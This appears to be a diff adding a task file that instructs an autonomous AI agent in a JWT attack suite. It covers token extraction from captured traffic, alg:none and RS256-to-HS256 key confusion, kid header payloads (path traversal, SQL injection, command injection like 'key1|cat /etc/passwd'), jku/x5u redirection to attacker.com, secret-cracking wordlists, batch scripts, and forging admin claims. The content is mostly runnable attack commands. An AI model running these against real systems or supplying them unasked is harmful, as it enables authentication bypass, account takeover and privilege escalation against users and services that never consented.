@@ -1,0 +1,763 @@
+================================================================================
+TASK 61 · JWT ATTACK SUITE
+================================================================================
+Covers testing_toolkit.txt Phase 7 Step 22
+High-impact auth bypass via JWT vulnerabilities.
+
+OBJECTIVE:
+- Extract and analyze JWT tokens from all sources
+- Exploit algorithm confusion (none, HS256↔RS256)
+- Abuse header injection (kid, jku, x5u, jwk)
+- Crack weak secrets with optimized wordlists
+- Forge administrative tokens for privilege escalation
+
+================================================================================
+INPUTS
+================================================================================
+outputs/har/accounts/*_auth.json          ← Auth tokens from HAR analysis (per-account)
+outputs/har/common_data.txt               ← Endpoints from HAR analysis
+outputs/live_base_urls.txt                ← Target hosts
+outputs/api_endpoints_from_openapi.txt    ← API specs
+temp/agent1/js_files.txt                  ← JS files (may contain secrets)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/jwt_attacks/
+├── discovered_tokens.json         ← All extracted JWTs with metadata
+├── token_analysis.json            ← Decoded tokens with vulnerability flags
+├── algorithm_confusion.txt        ← Successful alg bypass results
+├── header_injection.txt           ← kid/jku/x5u exploitation results
+├── cracked_secrets.txt            ← Successfully cracked signing keys
+├── forged_tokens.json             ← Crafted tokens that work
+├── privilege_escalation.txt       ← Admin access confirmations
+└── scan_log.txt                   ← Full execution log
+
+================================================================================
+🧠 JWT FUNDAMENTALS - UNDERSTAND BEFORE ATTACKING 🧠
+================================================================================
+
+───────────────────────────────────────
+JWT Structure
+───────────────────────────────────────
+Header.Payload.Signature (Base64URL encoded, dot-separated)
+
+HEADER:
+{
+  "alg": "HS256",    ← Algorithm (CRITICAL - attack target)
+  "typ": "JWT",
+  "kid": "key-1"     ← Key ID (injection target)
+}
+
+PAYLOAD (Claims):
+{
+  "sub": "1234567890",     ← Subject (user ID)
+  "name": "John Doe",
+  "iat": 1516239022,       ← Issued at
+  "exp": 1516242622,       ← Expiration
+  "role": "user",          ← Role (escalation target)
+  "admin": false           ← Admin flag (escalation target)
+}
+
+SIGNATURE:
+HMACSHA256(
+  base64UrlEncode(header) + "." + base64UrlEncode(payload),
+  secret
+)
+
+───────────────────────────────────────
+Algorithm Types
+───────────────────────────────────────
+SYMMETRIC (same key signs & verifies):
+- HS256, HS384, HS512 (HMAC + SHA)
+- Secret must be KEPT SECRET
+
+ASYMMETRIC (private signs, public verifies):
+- RS256, RS384, RS512 (RSA)
+- ES256, ES384, ES512 (ECDSA)
+- PS256, PS384, PS512 (RSA-PSS)
+- Public key can be exposed
+
+NONE:
+- No signature at all
+- Should NEVER be accepted in production
+
+================================================================================
+PHASE 1: JWT DISCOVERY & EXTRACTION
+================================================================================
+
+───────────────────────────────────────
+1.1 Extract from HAR Files
+───────────────────────────────────────
+# Parse Authorization headers from HAR account files
+# Each account has separate auth file: outputs/har/accounts/<name>_auth.json
+for auth_file in outputs/har/accounts/*_auth.json; do
+  jq -r '.headers[]? | select(.name | test("authorization|bearer"; "i")) | .value' "$auth_file"
+done
+
+# Look for Bearer tokens in raw HAR
+grep -oP 'Bearer\s+\K[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' manual/har/*.har
+
+───────────────────────────────────────
+1.2 Extract from Cookies
+───────────────────────────────────────
+# Common JWT cookie names
+# token, jwt, access_token, id_token, auth, session, auth_token
+
+grep -oP '(token|jwt|access_token|id_token|auth|session)=[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' cookies.txt
+
+───────────────────────────────────────
+1.3 Extract from Response Bodies
+───────────────────────────────────────
+# JSON responses with tokens
+grep -oP '"(token|jwt|access_token|id_token|accessToken|idToken)":\s*"[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"' responses/
+
+───────────────────────────────────────
+1.4 Extract from JavaScript Files
+───────────────────────────────────────
+# Hardcoded tokens or secrets in JS
+grep -oP '[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}' temp/agent1/js_files.txt
+
+# Look for signing secrets
+grep -iP '(jwt|secret|signing|private).{0,20}(key|secret|password)' js_responses/
+
+───────────────────────────────────────
+1.5 Extract from Local Storage / URLs
+───────────────────────────────────────
+# Sometimes tokens in URL parameters
+grep -oP '[?&](token|jwt|access_token)=[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' urls.txt
+
+================================================================================
+PHASE 2: TOKEN ANALYSIS
+================================================================================
+
+───────────────────────────────────────
+2.1 Decode and Analyze with jwt_tool
+───────────────────────────────────────
+# Basic decode
+jwt_tool <TOKEN>
+
+# Full scan mode (ALL checks)
+jwt_tool <TOKEN> -M at
+
+# Output shows:
+# - Header (algorithm, kid, jku, etc.)
+# - Payload (claims, roles, expiry)
+# - Signature validity
+# - Vulnerability suggestions
+
+───────────────────────────────────────
+2.2 Manual Decode (Understand Structure)
+───────────────────────────────────────
+# Decode header
+echo "HEADER_PART" | base64 -d 2>/dev/null | jq .
+
+# Decode payload
+echo "PAYLOAD_PART" | base64 -d 2>/dev/null | jq .
+
+# Note: Base64URL uses - and _ instead of + and /
+# May need to add padding (=) if decode fails
+
+───────────────────────────────────────
+2.3 Identify Attack Surface
+───────────────────────────────────────
+CHECK HEADER FOR:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Field     │ Attack                              │ Priority                  │
+├───────────┼─────────────────────────────────────┼───────────────────────────┤
+│ alg       │ none, HS256/RS256 confusion         │ 🔴 CRITICAL               │
+│ kid       │ Path traversal, SQLi, Command inj   │ 🔴 CRITICAL               │
+│ jku       │ SSRF to attacker-controlled JWKS    │ 🔴 CRITICAL               │
+│ x5u       │ SSRF to attacker X.509 cert         │ 🔴 CRITICAL               │
+│ x5c       │ Embed attacker certificate          │ 🟠 HIGH                   │
+│ jwk       │ Embed attacker public key           │ 🟠 HIGH                   │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+CHECK PAYLOAD FOR:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Claim     │ Tampering Goal                      │ Priority                  │
+├───────────┼─────────────────────────────────────┼───────────────────────────┤
+│ sub       │ Change user ID → access other users │ 🔴 CRITICAL               │
+│ role      │ user → admin                        │ 🔴 CRITICAL               │
+│ admin     │ false → true                        │ 🔴 CRITICAL               │
+│ groups    │ Add admin group                     │ 🔴 CRITICAL               │
+│ exp       │ Extend expiration                   │ 🟠 HIGH                   │
+│ iat       │ Backdate token                      │ 🟡 MEDIUM                 │
+│ iss       │ Change issuer                       │ 🟡 MEDIUM                 │
+│ aud       │ Change audience                     │ 🟡 MEDIUM                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+PHASE 3: ALGORITHM CONFUSION ATTACKS
+================================================================================
+
+───────────────────────────────────────
+3.1 Algorithm "none" Attack
+───────────────────────────────────────
+# CONCEPT: Set alg to "none" and remove signature
+# Vulnerable servers accept unsigned tokens
+
+# Using jwt_tool
+jwt_tool <TOKEN> -X a
+
+# Manual approach:
+# 1. Decode header
+# 2. Change "alg": "HS256" → "alg": "none"
+# 3. Re-encode header
+# 4. Remove signature (empty string after last dot)
+# 5. Result: header.payload. (note trailing dot, no signature)
+
+# Variations to try:
+# "alg": "none"
+# "alg": "None"
+# "alg": "NONE"
+# "alg": "nOnE"
+
+jwt_tool <TOKEN> -X a -I -pc role -pv admin
+
+───────────────────────────────────────
+3.2 HS256 / RS256 Confusion (KEY CONFUSION)
+───────────────────────────────────────
+# CONCEPT: Server uses RS256 (asymmetric)
+# Attack: Change alg to HS256 and sign with PUBLIC KEY as secret
+# Result: Server uses public key to verify HMAC → success!
+
+# STEP 1: Get the public key
+# From JWKS endpoint: /.well-known/jwks.json
+# From x5c header in token
+# From TLS certificate
+# From JavaScript files
+
+curl -s https://target.com/.well-known/jwks.json | jq .
+
+# STEP 2: Convert JWKS to PEM (if needed)
+# jwt_tool can handle this automatically
+
+# STEP 3: Execute attack
+jwt_tool <TOKEN> -X k -pk public_key.pem
+
+# Or specify key directly
+jwt_tool <TOKEN> -S hs256 -k "$(cat public_key.pem)"
+
+───────────────────────────────────────
+3.3 RS256 to HS256 with Extracted Key
+───────────────────────────────────────
+#!/bin/bash
+# key_confusion_attack.sh
+
+TOKEN="$1"
+TARGET="$2"
+
+echo "[*] Fetching JWKS..."
+curl -s "${TARGET}/.well-known/jwks.json" -o jwks.json
+
+# Extract public key
+echo "[*] Extracting public key..."
+# Using jwt_tool's built-in conversion
+jwt_tool "$TOKEN" -X k -pk jwks.json
+
+# Or manual with openssl
+# Extract n and e from JWKS, convert to PEM
+
+echo "[*] Testing forged token..."
+
+================================================================================
+PHASE 4: HEADER INJECTION ATTACKS
+================================================================================
+
+───────────────────────────────────────
+4.1 kid (Key ID) Injection
+───────────────────────────────────────
+# CONCEPT: kid tells server which key to use for verification
+# If kid is used in file path, database query, or command → INJECTION
+
+# PATH TRAVERSAL - Read arbitrary file as key
+jwt_tool <TOKEN> -I -hc kid -hv "../../../../../../dev/null"
+jwt_tool <TOKEN> -I -hc kid -hv "../../../../../../etc/passwd"
+jwt_tool <TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""
+
+# Key = empty file = empty secret = easy to sign!
+
+# SQL INJECTION - Bypass key lookup
+jwt_tool <TOKEN> -I -hc kid -hv "' UNION SELECT 'ATTACKER_KEY' -- "
+jwt_tool <TOKEN> -I -hc kid -hv "1' OR '1'='1"
+jwt_tool <TOKEN> -I -hc kid -hv "non_existent_key' OR 'x'='x"
+
+# COMMAND INJECTION (rare but devastating)
+jwt_tool <TOKEN> -I -hc kid -hv "key1|cat /etc/passwd"
+jwt_tool <TOKEN> -I -hc kid -hv "key1;id;"
+jwt_tool <TOKEN> -I -hc kid -hv "key1`id`"
+
+───────────────────────────────────────
+4.2 jku (JWK Set URL) SSRF
+───────────────────────────────────────
+# CONCEPT: jku points to URL containing JWKS
+# Attack: Point to attacker-controlled server with our keys
+
+# STEP 1: Generate keypair
+jwt_tool -nk -nkp jwttool_custom
+
+# STEP 2: Create JWKS file with our public key
+# jwt_tool generates: jwttool_custom_jwks.json
+
+# STEP 3: Host JWKS on attacker server
+python3 -m http.server 8080 &
+# Or use Interactsh/ngrok
+
+# STEP 4: Inject jku pointing to our server
+jwt_tool <TOKEN> -X s -ju "https://attacker.com/jwttool_custom_jwks.json"
+
+# Bypass techniques if URL validation exists:
+jwt_tool <TOKEN> -I -hc jku -hv "https://trusted.com@attacker.com/jwks.json"
+jwt_tool <TOKEN> -I -hc jku -hv "https://trusted.com%40attacker.com/jwks.json"
+jwt_tool <TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json#trusted.com"
+jwt_tool <TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json?.trusted.com"
+
+───────────────────────────────────────
+4.3 x5u (X.509 URL) SSRF
+───────────────────────────────────────
+# Similar to jku but for X.509 certificate chains
+jwt_tool <TOKEN> -X s -xu "https://attacker.com/cert.pem"
+
+───────────────────────────────────────
+4.4 x5c (Embedded Certificate)
+───────────────────────────────────────
+# CONCEPT: x5c contains certificate chain in header
+# Attack: Embed our own certificate
+
+jwt_tool <TOKEN> -X c
+
+# Manually craft with self-signed cert
+openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
+
+───────────────────────────────────────
+4.5 jwk (Embedded Key)
+───────────────────────────────────────
+# CONCEPT: jwk header contains the public key itself
+# Attack: Embed our own key, sign with matching private key
+
+jwt_tool <TOKEN> -X i
+
+# Server trusts embedded key → we control verification!
+
+================================================================================
+PHASE 5: SECRET CRACKING
+================================================================================
+
+───────────────────────────────────────
+5.1 Optimized Wordlists for JWT
+───────────────────────────────────────
+# 🎯 BEST WORDLISTS FOR JWT SECRETS:
+
+# 1. jwt-secrets.txt (curated JWT-specific)
+# Common patterns: secret, password, jwt_secret, signing_key
+
+# 2. SecLists JWT wordlist
+# Location: SecLists/Passwords/JWT/jwt-secrets.txt
+
+# 3. Common patterns to generate:
+cat << 'EOF' > jwt_wordlist_custom.txt
+secret
+Secret
+SECRET
+password
+Password
+PASSWORD
+jwt
+JWT
+jwt_secret
+JWT_SECRET
+jwtSecret
+signing_key
+SIGNING_KEY
+signingKey
+private_key
+PRIVATE_KEY
+privateKey
+auth_secret
+AUTH_SECRET
+authSecret
+token_secret
+TOKEN_SECRET
+tokenSecret
+api_secret
+API_SECRET
+apiSecret
+app_secret
+APP_SECRET
+appSecret
+hmac_secret
+HMAC_SECRET
+hmacSecret
+hs256_secret
+HS256_SECRET
+hs256Secret
+key
+Key
+KEY
+supersecret
+SuperSecret
+SUPERSECRET
+changeme
+Changeme
+CHANGEME
+123456
+12345678
+123456789
+1234567890
+qwerty
+letmein
+admin
+administrator
+root
+toor
+pass
+passw0rd
+p@ssw0rd
+P@ssw0rd
+s3cr3t
+S3cr3t
+S3CR3T
+my_secret
+my-secret
+mysecret
+the_secret
+the-secret
+thesecret
+your_secret
+your-secret
+yoursecret
+default
+Default
+DEFAULT
+test
+Test
+TEST
+dev
+Dev
+DEV
+development
+Development
+DEVELOPMENT
+production
+Production
+PRODUCTION
+staging
+Staging
+STAGING
+EOF
+
+# 4. Company-specific patterns
+# ${company}secret, ${company}_jwt, ${company}2024, etc.
+
+───────────────────────────────────────
+5.2 Crack with jwt_tool
+───────────────────────────────────────
+# Basic dictionary attack
+jwt_tool <TOKEN> -C -d jwt_wordlist_custom.txt
+
+# With SecLists wordlist
+jwt_tool <TOKEN> -C -d /usr/share/seclists/Passwords/JWT/jwt-secrets.txt
+
+# Common passwords wordlist
+jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
+
+───────────────────────────────────────
+5.3 Crack with C-JWT-Cracker (Faster)
+───────────────────────────────────────
+# Brute force (short secrets only)
+jwtcrack <TOKEN>
+
+# With alphabet specification
+jwtcrack <TOKEN> -a "abcdefghijklmnopqrstuvwxyz0123456789"
+
+# Maximum length
+jwtcrack <TOKEN> -l 8
+
+───────────────────────────────────────
+5.4 Crack with hashcat (GPU-accelerated)
+───────────────────────────────────────
+# Extract hash for hashcat
+# JWT format: header.payload.signature
+# hashcat mode 16500
+
+# Create hash file
+echo "<TOKEN>" > jwt_hash.txt
+
+# Run hashcat
+hashcat -m 16500 jwt_hash.txt wordlist.txt
+
+# With rules for mutations
+hashcat -m 16500 jwt_hash.txt wordlist.txt -r best64.rule
+
+───────────────────────────────────────
+5.5 Generate Target-Specific Wordlist
+───────────────────────────────────────
+#!/bin/bash
+# generate_jwt_wordlist.sh
+
+COMPANY="$1"
+YEAR=$(date +%Y)
+
+cat << EOF
+${COMPANY}
+${COMPANY}123
+${COMPANY}${YEAR}
+${COMPANY}_secret
+${COMPANY}_jwt
+${COMPANY}_key
+${COMPANY}Secret
+${COMPANY}JWT
+${COMPANY}Key
+${COMPANY}_SECRET
+${COMPANY}_JWT
+${COMPANY}_KEY
+jwt_${COMPANY}
+secret_${COMPANY}
+key_${COMPANY}
+${COMPANY}!
+${COMPANY}@123
+${COMPANY}#${YEAR}
+${COMPANY}Api
+${COMPANY}API
+${COMPANY}_api_key
+${COMPANY}Auth
+${COMPANY}Token
+EOF
+
+# Usage: ./generate_jwt_wordlist.sh acmecorp >> jwt_wordlist_custom.txt
+
+================================================================================
+PHASE 6: CLAIM TAMPERING & PRIVILEGE ESCALATION
+================================================================================
+
+───────────────────────────────────────
+6.1 Modify Claims (After Cracking or Bypass)
+───────────────────────────────────────
+# Change role to admin
+jwt_tool <TOKEN> -I -pc role -pv admin -S hs256 -p "CRACKED_SECRET"
+
+# Change admin flag
+jwt_tool <TOKEN> -I -pc admin -pv true -S hs256 -p "CRACKED_SECRET"
+
+# Change user ID (IDOR)
+jwt_tool <TOKEN> -I -pc sub -pv 1 -S hs256 -p "CRACKED_SECRET"
+jwt_tool <TOKEN> -I -pc user_id -pv 1 -S hs256 -p "CRACKED_SECRET"
+
+# Add admin to groups array
+jwt_tool <TOKEN> -I -pc groups -pv '["users","admin"]' -S hs256 -p "CRACKED_SECRET"
+
+# Extend expiration
+jwt_tool <TOKEN> -I -pc exp -pv 9999999999 -S hs256 -p "CRACKED_SECRET"
+
+───────────────────────────────────────
+6.2 Common Escalation Claims
+───────────────────────────────────────
+# Role-based
+-pc role -pv "admin"
+-pc role -pv "superadmin"
+-pc role -pv "root"
+-pc role -pv "administrator"
+
+# Boolean flags
+-pc admin -pv true
+-pc is_admin -pv true
+-pc isAdmin -pv true
+-pc superuser -pv true
+-pc staff -pv true
+
+# Permission arrays
+-pc permissions -pv '["read","write","delete","admin"]'
+-pc scopes -pv '["admin","*"]'
+
+# Group membership
+-pc groups -pv '["admin"]'
+-pc roles -pv '["admin","user"]'
+
+───────────────────────────────────────
+6.3 Verify Escalation
+───────────────────────────────────────
+# Test forged token against protected endpoint
+curl -H "Authorization: Bearer FORGED_TOKEN" https://target.com/admin/users
+
+# Compare responses
+# Original token → 403 Forbidden
+# Forged token → 200 OK = VULNERABLE! 🎯
+
+================================================================================
+PHASE 7: AUTOMATED FULL SCAN
+================================================================================
+
+───────────────────────────────────────
+7.1 jwt_tool All Attacks Mode
+───────────────────────────────────────
+# Run ALL automated tests
+jwt_tool <TOKEN> -M at -t "https://target.com/api/profile" -rh "Authorization: Bearer"
+
+# Options breakdown:
+# -M at      = All Tests mode
+# -t         = Target URL to test against
+# -rh        = Request header format
+
+───────────────────────────────────────
+7.2 Batch Processing Multiple Tokens
+───────────────────────────────────────
+#!/bin/bash
+# jwt_batch_scan.sh
+
+TOKENS_FILE="$1"
+TARGET="$2"
+OUTPUT_DIR="outputs/jwt_attacks"
+
+mkdir -p "$OUTPUT_DIR"
+
+while read -r token; do
+    echo "[*] Analyzing token..."
+    
+    # Decode
+    jwt_tool "$token" >> "$OUTPUT_DIR/token_analysis.json"
+    
+    # Algorithm attacks
+    jwt_tool "$token" -X a >> "$OUTPUT_DIR/algorithm_confusion.txt" 2>&1
+    
+    # Crack with wordlist
+    jwt_tool "$token" -C -d jwt_wordlist_custom.txt >> "$OUTPUT_DIR/cracked_secrets.txt" 2>&1
+    
+    # Full scan against target
+    jwt_tool "$token" -M at -t "$TARGET" >> "$OUTPUT_DIR/full_scan.txt" 2>&1
+    
+done < "$TOKENS_FILE"
+
+echo "[+] Scan complete. Results in $OUTPUT_DIR"
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+JWT attacks require methodical analysis and contextual exploitation.
+
+BEFORE ATTACKING:
+─────────────────
+1. EXTRACT tokens from ALL sources (HAR, cookies, JS, responses)
+2. DECODE each token to understand structure
+3. IDENTIFY the algorithm (HS256 vs RS256 changes attack path)
+4. NOTE claims that control access (role, admin, sub)
+5. FIND where public key might be exposed (.well-known/jwks.json)
+
+ATTACK PRIORITY:
+────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Priority │ Attack                  │ Why First?                            │
+├──────────┼─────────────────────────┼───────────────────────────────────────┤
+│ 1        │ alg: none               │ Instant win if vulnerable             │
+│ 2        │ HS256/RS256 confusion   │ No secret needed if RS256 → HS256     │
+│ 3        │ kid injection           │ Path traversal to /dev/null = empty   │
+│ 4        │ jku/x5u SSRF            │ Point to attacker JWKS                │
+│ 5        │ Secret cracking         │ Try if symmetric (HS256)              │
+│ 6        │ Claim tampering         │ After any successful bypass           │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+CONTEXTUAL DECISIONS:
+─────────────────────
+IF alg is RS256:
+  → Try RS256→HS256 confusion with public key
+  → Look for public key at /.well-known/jwks.json
+  → Extract from TLS certificate: openssl s_client -connect host:443
+  
+IF alg is HS256:
+  → Focus on secret cracking
+  → Try common wordlists first (fast)
+  → Generate company-specific wordlist
+  → Use hashcat for GPU acceleration if large wordlist
+
+IF kid header present:
+  → Path traversal: ../../dev/null
+  → SQLi: ' OR '1'='1
+  → Command injection: |id
+
+IF jku/x5u header present:
+  → SSRF to your server
+  → Start Interactsh: interactsh-client
+  → Host your JWKS
+
+SIGNS OF VULNERABILITY:
+───────────────────────
+✓ Token accepted with different algorithm
+✓ Token accepted without signature (alg: none)
+✓ Server fetches URL from jku/x5u
+✓ Error messages reveal key operations
+✓ Short/weak secret cracked
+
+VERIFICATION CHECKLIST:
+───────────────────────
+□ Forged token returns 200 instead of 401/403
+□ Response contains elevated data (admin panel, other users)
+□ Can access endpoints that original token couldn't
+□ Can perform actions that original token couldn't
+
+================================================================================
+COMMON MISTAKES TO AVOID
+================================================================================
+❌ Not trying ALL algorithm variations (none, None, NONE, nOnE)
+❌ Forgetting trailing dot for alg:none (header.payload.)
+❌ Not looking for public key before RS256→HS256 attack
+❌ Using rockyou.txt before JWT-specific wordlists
+❌ Not generating company-specific wordlist
+❌ Missing kid injection when header present
+❌ Not verifying forged token actually works
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ All JWT tokens extracted and catalogued
+✓ Each token analyzed for vulnerabilities
+✓ Algorithm confusion attacks attempted
+✓ Header injection attacks attempted (kid/jku/x5u)
+✓ Secret cracking attempted with optimized wordlists
+✓ Successful bypasses documented with forged tokens
+✓ Privilege escalation verified on protected endpoints
+
+================================================================================
+QUICK REFERENCE: jwt_tool COMMANDS
+================================================================================
+# Decode token
+jwt_tool <TOKEN>
+
+# Algorithm none attack
+jwt_tool <TOKEN> -X a
+
+# Key confusion (RS256 → HS256)
+jwt_tool <TOKEN> -X k -pk public_key.pem
+
+# jku SSRF
+jwt_tool <TOKEN> -X s -ju "https://attacker.com/jwks.json"
+
+# kid injection
+jwt_tool <TOKEN> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
+
+# Crack secret
+jwt_tool <TOKEN> -C -d wordlist.txt
+
+# Modify claims
+jwt_tool <TOKEN> -I -pc role -pv admin -S hs256 -p "secret"
+
+# All attacks mode
+jwt_tool <TOKEN> -M at -t "https://target.com/api"
+
+# Generate new keypair
+jwt_tool -nk -nkp mykey
+
+================================================================================
+WORDLIST LOCATIONS (MUST HAVE)
+================================================================================
+# SecLists JWT wordlist (BEST)
+/usr/share/seclists/Passwords/JWT/jwt-secrets.txt
+
+# Common passwords (fallback)
+/usr/share/wordlists/rockyou.txt
+
+# Custom generated (TARGET-SPECIFIC)
+jwt_wordlist_custom.txt
+
+# Create combined optimized wordlist:
+cat seclists_jwt.txt custom_company.txt common_patterns.txt | sort -u > jwt_master_wordlist.txt
+
